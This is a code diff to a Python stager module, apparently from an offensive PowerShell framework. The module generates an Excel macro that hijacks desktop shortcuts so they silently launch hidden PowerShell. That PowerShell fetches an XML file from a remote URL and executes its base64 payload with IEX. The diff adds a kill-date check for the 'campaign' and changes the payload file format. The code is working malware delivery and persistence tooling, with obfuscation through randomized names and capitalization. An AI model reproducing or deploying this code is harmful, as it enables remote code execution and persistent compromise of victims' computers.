@@ -1,4 +1,4 @@
-import random, string, xlrd
+import random, string, xlrd, datetime
 from xlutils.copy import copy
 from xlwt import Workbook, Utils
 from lib.common import helpers
@@ -57,6 +57,11 @@ class Stager:
                 'Description'   :   'Local path + file to output xml to.',
                 'Required'      :   True,
                 'Value'         :   '/var/www/html/'+xmlVar+'.xml'
+            },
+	    'KillDate' : {
+                'Description'   :   'Date after which the initial powershell stub will no longer attempt to download and execute code, set this for the end of your campaign / engagement. Format mm/dd/yyyy',
+                'Required'      :   True,
+                'Value'         :   datetime.datetime.now().strftime("%m/%d/%Y")
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -120,15 +125,20 @@ class Stager:
 	xlsOut = self.options['XlsOutFile']['Value']
 	XmlPath = self.options['XmlUrl']['Value']
 	XmlOut = self.options['XmlOutFile']['Value']
+	killDate = self.options['KillDate']['Value'].replace('\\','/').replace(' ','').split('/')
+	killDate = [int(i) for i in killDate]
+	if(killDate[2] < 100):
+		killDate[2] = killDate[2] + 2000
+		print(killDate[2])
 	targetEXE = targetEXE.split(',')
 	targetEXE = filter(None,targetEXE)
+
 
 	shellVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
 	lnkVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
 	fsoVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
 	folderVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
 	fileVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
-
 
 
         # generate the launcher
@@ -152,12 +162,11 @@ class Stager:
 	    #sets initial coords for writing data to
 	    inputRow = random.randint(50,70)
 	    inputCol = random.randint(40,60)
-	   
 
 	    #build out the macro - will look for all .lnk files on the desktop, any that it finds it will inspect to determine whether it matches any of the target exe names
             macro = "Sub Auto_Close()\n"
 	
-	    #writes strings + payload to cells of the target XLS doc
+
 	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("Wscript.shell"))
 	    macro += "Set " + shellVar + " = CreateObject(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)\n"
 	    inputCol = inputCol + random.randint(1,4)
@@ -182,20 +191,21 @@ class Stager:
 		macro += "InStr(Lcase(" + lnkVar + ".targetPath), activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)"
 		inputCol = inputCol + random.randint(1,4)
 	    macro += ") Then\n"
-
-	    #setup of payload, the multiple strings are assemled at runtime 
+ 
 	    launchString1 = "hidden -nop -command \"[System.Diagnostics.Process]::Start(\'"
-	    launchString2 = "\');$u=New-Object -comObject wscript.shell;Get-ChildItem -Path $env:USERPROFILE\desktop -Filter *.lnk | foreach { $lnk = $u.createShortcut($_.FullName); if($lnk.arguments -like \'*xml.xmldocument*\') {$start = $lnk.arguments.IndexOf(\'\'\'\') + 1; $result = $lnk.arguments.Substring($start, $lnk.arguments.IndexOf(\'\'\'\', $start) - $start );$lnk.targetPath = $result; $lnk.Arguments = \'\'; $lnk.Save()}};$b = New-Object System.Xml.XmlDocument;$b.Load(\'" 
-	    launchString3 = "\');[Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($b.command.a.execute))|IEX\""
+	    launchString2 = "\');$u=New-Object -comObject wscript.shell;Get-ChildItem -Path $env:USERPROFILE\desktop -Filter *.lnk | foreach { $lnk = $u.createShortcut($_.FullName);if($lnk.arguments -like \'*xml.xmldocument*\') {$start = $lnk.arguments.IndexOf(\'\'\'\') + 1; $result = $lnk.arguments.Substring($start, $lnk.arguments.IndexOf(\'\'\'\', $start) - $start );$lnk.targetPath = $result; $lnk.Arguments = \'\'; $lnk.Save()}};$b = New-Object System.Xml.XmlDocument;if([int](get-date -UFormat "
+	    launchString25 = ") -le " + str(killDate[2]) + str(killDate[0]) + str(killDate[1]) + "){$b.Load(\'" 
+	    launchString3 = "\');[Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($b.main))|IEX}\""
 	    
-	  
+
 	    #part of the macro that actually modifies the LNK files on the desktop, sets iconlocation for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
 	    macro += lnkVar + ".IconLocation = " + lnkVar + ".targetpath\n"
 	   
 	    launchString1 = helpers.randomize_capitalization(launchString1)
 	    launchString2 = helpers.randomize_capitalization(launchString2)
 	    launchString3 = helpers.randomize_capitalization(launchString3)
-	    launchString4 = launchString2 + XmlPath + launchString3
+	    launchString25 = helpers.randomize_capitalization(launchString25)
+	    launchString4 = launchString2 + "'%Y%m%d'" + launchString25 + XmlPath + launchString3
 
 	    activeSheet.write(inputRow,inputCol,launchString1)
 	    launch1Coords = self.coordsToCell(inputRow,inputCol) 
@@ -211,27 +221,24 @@ class Stager:
 	    inputCol = inputCol + random.randint(1,4)
 	    macro += lnkVar + ".save\n"
 
-	    
 	    macro += "end if\n"
 	    macro += "end if\n"
 	    macro += "next " + fileVar + "\n"
 
 	    macro += "End Sub\n"
 	    activeSheet.row(inputRow).hidden = True 
-	    print("\nWriting xls...\n")
+	    print helpers.color("\nWriting xls...\n", color="blue")
 	    workBook.save(xlsOut)
-	    print("xls written to " + xlsOut + "  please remember to add macro code to xls prior to use\n\n")
+	    print helpers.color("xls written to " + xlsOut + "  please remember to add macro code to xls prior to use\n\n", color="green")
 
 #write XML to disk
 
-	    print("Writing xml...\n")
+	    print helpers.color("Writing xml...\n", color="blue")
 	    f = open(XmlOut,"w")
 	    f.write("<?xml version=\"1.0\"?>\n")
-	    f.write("<command>\n")
-	    f.write("\t<a>\n")
-	    f.write("\t<execute>"+launcher+"</execute>\n")
-	    f.write("\t</a>\n")
-	    f.write("</command>\n")
-	    print("xml written to " + XmlOut + " please remember this file must be accessible by the target at this url: " + XmlPath + "\n")
+	    f.write("<main>")
+	    f.write(launcher)
+	    f.write("</main>\n")
+	    print helpers.color("xml written to " + XmlOut + " please remember this file must be accessible by the target at this url: " + XmlPath + "\n", color="green")
 
             return macro
